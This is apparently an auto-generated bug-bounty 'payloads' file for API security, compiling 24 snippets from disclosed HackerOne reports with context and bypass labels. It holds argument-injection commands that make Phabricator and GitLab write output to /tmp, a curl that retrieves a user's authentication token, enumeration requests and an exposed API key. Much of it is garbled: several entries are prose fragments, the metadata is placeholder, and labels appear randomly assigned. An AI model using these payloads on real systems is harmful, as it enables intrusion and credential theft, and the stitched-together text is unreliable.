---
vuln_type: "API_Security"
file_type: "payloads"
total_reports: "409"
avg_bounty: "1022"
max_bounty: "2162"
severity_distribution: "critical:0% high:2% medium:3% low:95%"
owasp_categories: ["A00:2021"]
common_cwe: ["CWE-000"]
last_updated: "2026-04-09"
tags: ["API_Security", "web", "api", "A00", "hunter-kb"]
related_vulns: ["Information_Disclosure", "Broken_Access_Control", "SSRF"]
---


# API Security — Payloads

 This payload structure operates reliably against standard implementations lacking modern security boundaries or active request filtering components. This payload structure operates reliably against standard implementations lacking modern security boundaries or active request filtering components.

> [!TIP]
> Always iterate. Test a canary token to figure out parsing logic, then increment to full payload structures.

> [!WARNING]
> Execute payloads explicitly only against authorized systems in accordance with program SLA scopes.

## Basic Payloads

#### Payload 1

```javascript
-consumer_key
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1001951](https://hackerone.com/reports/1001951)

#### Payload 2

```javascript
https://████████/rest/api/2/user/picker?query=
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1005020](https://hackerone.com/reports/1005020)

#### Payload 3

```javascript
curl -u "RANDOM1:RANDOM2" -X PROPFIND https://server/public.php/webdav
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1005421](https://hackerone.com/reports/1005421)

#### Payload 4

```javascript
/ocs/v2.php/apps/spreed/api/v1/chat/$token/share
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1011767](https://hackerone.com/reports/1011767)

#### Payload 5

```javascript
://████████/███/?#/
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1018368](https://hackerone.com/reports/1018368)

## Context-Specific Payloads

#### Payload 6

```javascript
://coda.io/internalAppApi/documents/[doc ID]/packs
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #101977](https://hackerone.com/reports/101977)

#### Payload 7

```javascript
{"packId":[pack Id]}
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1021776](https://hackerone.com/reports/1021776)

#### Payload 8

```javascript
https://3d.cs.money/item/0UkWN8vh2R
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1022048](https://hackerone.com/reports/1022048)

#### Payload 9

```javascript
'https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=AIzaSyAw-SpLHVTIP3IFEIkckCuEmIhnUrY9OrQ';
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1023572](https://hackerone.com/reports/1023572)

#### Payload 10

```javascript
curl http://dev.localhost/api/diffusion.internal.gitrawdiffquery \
    -d api.token=api-token \
    -d commit=--output%3D/tmp/qqq \
    -d repository=R2
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1024880](https://hackerone.com/reports/1024880)

## Advanced Payloads

#### Payload 11

```javascript
/api/v1/users.2fa.sendEmailCode
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1028392](https://hackerone.com/reports/1028392)

#### Payload 12

```javascript
POST /api/v1/users.2fa.sendEmailCode HTTP/1.1
Host: rocket-chat.local:3000
Referer: http://rocket-chat.local:3000/home
Connection: close
Content-Length: 36
Content-Type:... This report describes a API_Security issue affecting the target application surface. The disclosed finding is titled "Hi! Security Team Rocket.Chat,..." and indicates exploitable input handling weaknesses. Observed report context: **Description:** Email enumeration vulnerability. Vulnerable api method:
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1031321](https://hackerone.com/reports/1031321)

#### Payload 13

```javascript
##Releases Affected:: * Rocket.Chat up to 3.10.5 Request for existing account:
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1031613](https://hackerone.com/reports/1031613)

#### Payload 14

```javascript
[{"id":5,"description":"","name":"test","name_with_namespace":"Jodrico Jansen Van Vuuren /... This report describes a API_Security issue affecting the target application surface. The disclosed finding is titled "Exposed gitlab repo at..." and indicates exploitable input handling weaknesses. Observed report context: ## Summary: Hello I found Exposed gitlab repo at https://adammanco.mtn.com/api/v4/projects ## Steps To Reproduce: Visit https://adammanco.mtn.com/api/v4/projects ## Supporting Material/References:
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1032468](https://hackerone.com/reports/1032468)

#### Payload 15

```javascript
{
  "authorPHID": "PHID-USER-uyg3nn764yetx6nglnbx",
  "tokenPHID": "PHID-TOKN-medal-4",
  "objectPHID": "PHID-TASK-lg22pqfkf4iuqbmx35k4"
}
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1035742](https://hackerone.com/reports/1035742)

## WAF Bypass Payloads

#### Payload 16

```javascript
████ for password assistance.
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1040786](https://hackerone.com/reports/1040786)

#### Payload 17

```javascript
$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'
"[redacted]"
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1047125](https://hackerone.com/reports/1047125)

## Encoding & Obfuscation

#### Payload 18

```javascript
POST /apiv1/inviteemail HTTP/1.1
Host: unikrn.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://unikrn.com/profile
Content-Type:... This report describes a API_Security issue affecting the target application surface. The disclosed finding is titled "session_id is not being validated at..." and indicates exploitable input handling weaknesses. Observed report context: session_id is not being validated at email invitation endpoint request sample:
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1048571](https://hackerone.com/reports/1048571)

#### Payload 19

```javascript
(POST) /grapql
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1050753](https://hackerone.com/reports/1050753)

#### Payload 20

```javascript
def authenticate_with_api_key
  api_key   = request.headers["Authorization"] || params[:api_key]
  @api_user = User.find_by_api_key(api_key)
end
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1051029](https://hackerone.com/reports/1051029)

## Polyglot Payloads

#### Payload 21

```javascript
`curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1057216](https://hackerone.com/reports/1057216)

#### Payload 22

```javascript
handleRoutePushEvent({pathname: e, search: t, state: a, hash: o}) {
                const {adminPath: n, history: i} = this.props // `adminPath` = `/admin`
                  , s = "".concat(n).concat(e);
                // *** //
}
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1061292](https://hackerone.com/reports/1061292)

## Blind / Out-of-Band Payloads

#### Payload 23

```javascript
/nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1064149](https://hackerone.com/reports/1064149)

## Chained Payloads

#### Payload 24

```javascript
//YOUR_LINK/item/WHAT_EVER_YOU_WANT
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1065041](https://hackerone.com/reports/1065041)


